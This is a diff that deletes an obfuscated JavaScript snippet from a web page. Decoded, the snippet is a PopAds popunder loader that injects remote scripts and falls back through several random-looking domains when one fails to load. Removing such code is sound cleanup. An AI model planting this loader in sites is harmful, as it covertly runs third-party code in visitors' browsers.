@@ -1,7 +1,0 @@
-/*<![CDATA[/* */
-
-/* Privet darkv. Each domain is 2h fox dead */
-
- (function(){ var n=window;n["\u005fp\u006fp"]=[["\x73\x69\u0074\u0065I\x64",1302075],["\u006d\u0069nBid",0],["\u0070\x6f\u0070u\x6e\u0064\u0065\u0072\x73P\x65\u0072\u0049\u0050",0],["d\x65\u006c\u0061\u0079B\x65\u0074\x77ee\u006e",0],["\x64e\x66\x61\u0075\x6ct",false],["de\x66ault\u0050\u0065\x72\x44\x61\u0079",0],["\x74\x6fpm\x6f\x73\u0074\u004c\x61\x79er",!0]];var t=["/\u002f\x631\x2e\u0070\x6fpa\x64s.\u006e\u0065t\u002f\u0070\x6f\x70\u002ejs","\x2f\u002f\u0063\u0032\x2e\x70\u006f\u0070a\x64\x73\u002e\x6ee\u0074\x2f\u0070\x6fp\u002e\x6a\u0073","/\u002f\u0077\u0077\u0077.\x61\u0061\u0062\x6d\u0078ezp\u0068\x2e\x63\u006f\x6d/iy.\x6a\x73","/\u002f\u0077\x77\x77.l\u007ak\x75\x71\u0062\x70\u0074\x63jqt\x61.\u0063\u006f\x6d\x2fx\x64\u006e\x2e\x6a\u0073",""],v=0,j,l=function(){if(""==t[v])return;j=n["doc\u0075\x6d\x65\x6e\u0074"]["\x63r\x65\x61\x74eE\x6c\x65\x6d\x65\u006e\x74"]("\x73\x63rip\x74");j["\x74\u0079\u0070e"]="\u0074e\x78\u0074/\u006a\x61\u0076asc\u0072\x69\u0070\x74";j["\u0061s\x79nc"]=!0;var x=n["\u0064ocu\u006de\u006e\u0074"]["\u0067e\x74\u0045le\x6d\u0065\u006et\u0073B\x79\u0054a\u0067\u004e\x61m\u0065"]("\u0073\x63\u0072\x69p\u0074")[0];j["\x73r\x63"]=t[v];if(v<2){j["\x63\u0072\u006fs\u0073\u004f\u0072i\x67\u0069\x6e"]="ano\u006eym\u006fu\u0073";};j["\u006f\u006e\x65\x72r\u006fr"]=function(){v++;l()};x["p\x61\u0072\u0065\u006e\u0074\x4e\x6f\x64\x65"]["\u0069\x6e\u0073\u0065\u0072\x74B\x65f\x6fre"](j,x)};l()})();
-
-/*]]>/* */
